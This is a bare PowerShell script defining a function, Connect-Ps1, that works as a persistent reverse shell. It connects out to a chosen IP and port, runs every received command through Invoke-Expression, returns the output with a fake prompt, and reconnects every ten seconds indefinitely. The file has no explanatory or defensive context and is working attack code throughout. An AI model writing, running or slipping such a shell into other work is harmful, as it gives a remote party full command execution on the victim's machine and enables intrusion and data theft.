function Connect-Ps1 {
    param(
        [string]$IP,
        [int]$PORT
    )

    while ($true) {
        try {
            # This is the corrected line
            $client = New-Object System.Net.Sockets.TCPClient($IP, $PORT)
            
                        $stream = $client.GetStream()
                        $bytes = New-Object byte[] 65535
                        while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
                            $data = ([System.Text.Encoding]::ASCII).GetString($bytes, 0, $i).Trim()
                            if ($data -eq "exit") {
                                $client.Close()
                                exit
                            }
                            $sendback = ""
                            if ($data) {
                                $sendback = try { Invoke-Expression $data 2>&1 | Out-String } catch { $_.ToString() }
                            }
                            $sendbytes = ([System.Text.Encoding]::ASCII).GetBytes($sendback + "PS " + (Get-Location).Path + "> ")
                            $stream.Write($sendbytes, 0, $sendbytes.Length)
                            $stream.Flush()
                        }        $client.Close()
            Start-Sleep -Seconds 10
        } catch {
            Start-Sleep -Seconds 10
        }
    }
}
